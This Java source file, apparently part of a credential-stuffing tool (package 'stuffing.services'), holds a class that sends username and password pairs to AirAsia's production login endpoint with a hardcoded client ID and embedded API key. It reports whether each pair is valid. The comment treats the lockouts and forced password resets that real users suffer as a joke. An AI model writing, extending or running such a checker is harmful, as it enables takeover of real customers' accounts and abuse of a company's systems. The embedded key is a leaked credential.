package stuffing.services;

import java.io.IOException;

import static httpclient.URLEncodedForm.newFormBody;
import static java.nio.charset.StandardCharsets.UTF_8;
import static stuffing.util.Functions.escapeJson;
import static stuffing.util.Utils.newHttpCall;

public class AirAsia {

    // The login form will tell you what the password requirements are and block a request until you get it
    // right. Ouch. And then it gets worse, apparently they require password resets after a number of bad logins
    // Must be fun for the real users.

    public static void main(final String... args) throws IOException {
        login("test1@test.com", "Test123!");
    }
    public static boolean login(final String username, final String password) throws IOException {

        final var response = newHttpCall()
            .uri("https://ssor.airasia.com")
            .post("/auth/v2/authorization/2fa/first-authentication/by-credentials?clientId=PRD-AAWWW-5NS5DMQ6&gaClientId=")
            .header("Content-Type", "application/json")
            .header("X-Api-Key", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJRcFJrVzkwWUhBNTUwVjdTUldDQ2huUWhKVEc0SFIwcyIsImV4cCI6MTcyNzAyMDYxOSwiaWF0IjoxNzI3MDEzNDE5LCJzdWIiOiJQUkQtQUFXV1ctNU5TNURNUTYifQ.QH8ZnRVELePWlAu1xL05ulb10JR2ck2RgK8GG3WxAR8")
            .body("{\"username\":\"" + escapeJson(username) + "\",\"password\":\"" + escapeJson(password) + "\",\"status\":\"\"}")
            .execute()
            .fetchBodyAsString(UTF_8);

        return !"{\"code\":\"INVALID_CREDENTIALS\",\"message\":\"Invalid Username or Password\"}".equals(response);
    }

}
